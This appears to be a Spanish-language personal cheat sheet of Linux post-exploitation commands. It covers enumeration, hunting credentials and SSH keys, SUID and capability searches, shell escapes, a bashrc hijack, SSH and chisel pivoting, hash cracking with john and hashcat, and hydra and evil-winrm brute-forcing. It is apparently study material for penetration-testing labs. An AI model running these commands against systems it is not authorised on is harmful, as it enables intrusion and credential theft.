---
title: "Linux"
description: "Apuntes"
date: "2025-16-12"
tags: ["Linux"]
---



## 1. Información de Usuario y Sistema

### Usuario y Grupos

```bash
whoami
id
cat /etc/passwd
grep "sh$" /etc/passwd
getent group sudo
cat /etc/group
ls /home
lastlog
w
```

### Host y OS

```bash
hostname
cat /etc/os-release
uname -a
lscpu
cat /etc/shells
```

### Variables de Entorno

```bash
env
echo $PATH
```

---

## 2. Procesos y Servicios

```bash
ps auxwww
ps -u root
ps -u $USER
ps aux | grep root
ps aux | grep tmux
```

Servicios y puertos:

```bash
ss -tuln
netstat -tulnp
```

---

## 3. Red y Conectividad

```bash
ip a
route
arp -a
cat /etc/hosts
cat /etc/resolv.conf
```

Captura de tráfico:

```bash
tcpdump -i eth0 -w file.pcap
```

---

## 4. Archivos Temporales, Ocultos y Backups

```bash
ls -l /tmp /var/tmp /dev/shm
find / -type f -name ".*" 2>/dev/null
find / -type d -name ".*" 2>/dev/null
find / -name '*_history' 2>/dev/null
find / -type f -iname "*.bak" 2>/dev/null
```

---

## 5. Búsqueda de Credenciales

### Grep General

```bash
grep -rnw '/' -ie "PASS=" 2>/dev/null
grep -rnw '/' -ie "PASSWORD=" 2>/dev/null
grep -rnw '/' -ie "pass" 2>/dev/null
```

### Archivos comunes

```bash
find / -type f -name "*.txt" 2>/dev/null
find / -type f -name "*.conf" 2>/dev/null
find / -type f -name "*.config" 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src|snap|share"
```

### Web

```bash
ls -la /var/www/html
grep -r "password|passwd|PWD" /var/www/
```

---

## 6. SSH y Accesos

```bash
ls ~/.ssh
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
cat ~/.ssh/known_hosts
```

Logs útiles:

```bash
/var/log/auth.log
/var/log/secure
```

---

## 7. Cron Jobs y Archivos Escribibles

```bash
ls -la /etc/cron*
crontab -l
find / -type f -writable 2>/dev/null
find / -type f -perm -o+w -name "*.sh" 2>/dev/null
```

---

## 8. SUID / SGID / Capabilities

### SUID / SGID

```bash
find / -type f -perm -4000 -ls 2>/dev/null
find / -perm -6000 -type f 2>/dev/null
```

### Capabilities

```bash
find / -type f -exec getcap {} + 2>/dev/null
```

Capacidades críticas:

- cap_sys_admin
    
- cap_dac_override
    
- cap_setuid / cap_setgid
    
- cap_net_bind_service
    
- cap_net_raw
    

---

## 9. Grupos Privilegiados Importantes

- **sudo** – comandos como root
    
- **docker** – montar FS del host
    
- **lxd** – contenedores privilegiados
    
- **disk** – acceso a discos
    
- **adm** – lectura de logs
    

---

## 10. Escapes Comunes

### Binarios

```bash
echo "/bin/bash" > shell
chmod +x shell
./shell
```

### Editores / Lenguajes

```bash
vi    # :!bash
less  # !bash
awk 'BEGIN {system("/bin/bash")}'
python -c 'import os; os.system("/bin/bash")'
```

### Bashrc Hijack

```bash
echo "/bin/bash" >> ~/.bashrc
```

---

## 11. Port Forwarding / Pivoting

### Local Port Forward

```bash
ssh -L 8888:localhost:3306 user@host
```

### Remote Port Forward

```bash
ssh -R 4444:localhost:4444 user@host
```

### Dynamic (SOCKS)

```bash
ssh -D 9050 user@host
```

---

## 12. Chisel (Pivoting)

Servidor:

```bash
./chisel server -p 1234 --socks5
```

Cliente:

```bash
./chisel client host:1234 socks
```

---

## 13. Cracking de Hashes

### John

```bash
john --format=sha512crypt -w rockyou.txt hash.txt
john --format=NT -w rockyou.txt hash.txt
```

### Hashcat

```bash
hashcat -a 0 -m 1000 hash.txt wordlist.txt
```

---

## 14. Windows / Servicios Remotos

### Evil-WinRM

```bash
evil-winrm -i IP -u user -p pass
```

### Hydra

```bash
hydra -L users.txt -P pass.txt ssh://IP
hydra -L users.txt -P pass.txt rdp://IP
hydra -L users.txt -P pass.txt smb://IP
```

